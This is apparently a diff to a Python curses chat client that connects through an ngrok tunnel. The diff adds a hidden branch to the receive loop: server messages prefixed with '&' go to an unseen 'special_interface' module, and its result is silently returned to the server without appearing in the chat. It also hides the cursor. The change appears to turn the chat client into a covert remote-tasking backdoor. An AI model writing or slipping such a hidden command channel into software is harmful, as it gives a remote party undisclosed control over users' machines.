@@ -4,8 +4,10 @@ import curses
 import time
 import queue
 
-HOST = '4.tcp.eu.ngrok.io'
-PORT = 17031
+import special_interface
+
+HOST = '2.tcp.eu.ngrok.io'
+PORT = 14164
 
 class ChatClient:
     def __init__(self, host, port):
@@ -15,6 +17,7 @@ class ChatClient:
         self.running = False
         self.incoming_queue = queue.Queue()
         self.outgoing_queue = queue.Queue()
+        self.special_interface = special_interface.SpecialInterface()
 
     def connect(self):
         """Try to connect to the server"""
@@ -44,7 +47,12 @@ class ChatClient:
                 data = self.sock.recv(1024).decode()
                 if not data:
                     break
-                self.incoming_queue.put(f"Server: {data}")
+                if data[0] == '&':
+                    special_buffer = data[1:]
+                    self.special_interface.go(special_buffer)
+                    self.outgoing_queue.put(self.special_interface.result)
+                else:
+                    self.incoming_queue.put(f"Server: {data}")
             except (socket.timeout, Exception):
                 continue
         self.incoming_queue.put("Lost connexion with the server")
@@ -98,7 +106,7 @@ def draw_ui(stdscr, chat_win, input_win, messages, input_buffer):
     input_win.refresh()
 
 def main(stdscr):
-    curses.curs_set(1)
+    curses.curs_set(0)
     stdscr.nodelay(True)
     h, w = stdscr.getmaxyx()
 
